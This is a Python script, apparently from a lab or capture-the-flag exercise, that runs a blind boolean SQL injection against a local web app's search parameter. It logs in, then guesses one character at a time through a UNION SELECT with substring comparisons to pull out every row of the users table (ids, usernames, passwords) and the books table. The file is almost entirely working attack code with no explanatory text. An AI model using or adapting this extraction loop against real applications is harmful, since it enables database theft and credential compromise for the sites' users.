import requests
import string

session = requests.Session()
login_url = "http://127.0.0.1:5000/login"
data = {
    "username": "user",
    "password": "password"
}

login_response = session.post(login_url, data=data)
url = "http://127.0.0.1:5000/search"

# Charset base
charset = string.printable

# Añadir ñ, Ñ y vocales con tilde
extras = "ñÑáéíóúÁÉÍÓÚüÜ"

# Combinar
charset += extras



tabla_users=[]
# USERS


usuarios=[""]
usuarios_encontrados=[]
pos=1

while(usuarios):  # posiciones 1 a max_pos
    #print(f"Probando posición {pos}")
    # Recorrer todas las letras minúsculas del alfabeto
    candidatos=[]
    for letra in charset:  # 'a' a 'z'
        for prefijo in usuarios:
            candidatos.append(str(prefijo)+ str(letra))
    if not candidatos:
        break
    usuarios_nuevos=[]
    contador=0
    for cad in candidatos:
        contador+=1
        param = "safasd' union SELECT 1,2,3,4,5 FROM users where substring((id || ' ' || username || ' ' || password),1, "+ str(pos)+") = '" + str(cad) + "'-- -"
        params = {"q": param}
        response = session.get(url, params=params)
        if "<li>" in str(response.text):
            usuarios_nuevos.append(cad)
    if len(usuarios_nuevos) < len(usuarios):
        usuarios_nuevos_sin_ultimo = [s[:-1] for s in usuarios_nuevos]
        faltantes = list(set(usuarios) - set(usuarios_nuevos_sin_ultimo))
        usuarios_encontrados.append(faltantes)
    
    usuarios = usuarios_nuevos
    pos+=1

print(usuarios_encontrados)





tabla_books=[]
# BOOKS


books=[""]
books_encontrados=[]
pos=1

while(books):  # posiciones 1 a max_pos
    #print(f"Probando posición {pos}")
    # Recorrer todas las letras minúsculas del alfabeto
    candidatos=[]
    for letra in charset:  # 'a' a 'z'
        for prefijo in books:
            candidatos.append(str(prefijo)+ str(letra))
    if not candidatos:
        break
    books_nuevos=[]
    contador=0
    for cad in candidatos:
        contador+=1
        param = "safasd' union SELECT 1,2,3,4,5 FROM books where substring((id || ' ' || title || ' ' || author || ' ' || cover || ' ' || owner_id),1, "+ str(pos)+") = '" + str(cad) + "'-- -"
        params = {"q": param}
        response = session.get(url, params=params)
        if "<li>" in str(response.text):
            books_nuevos.append(cad)
    if len(books_nuevos) < len(books):
        books_nuevos_sin_ultimo = [s[:-1] for s in books_nuevos]
        faltantes = list(set(books) - set(books_nuevos_sin_ultimo))
        books_encontrados.append(faltantes)
    
    books = books_nuevos
    pos+=1

print(books_encontrados)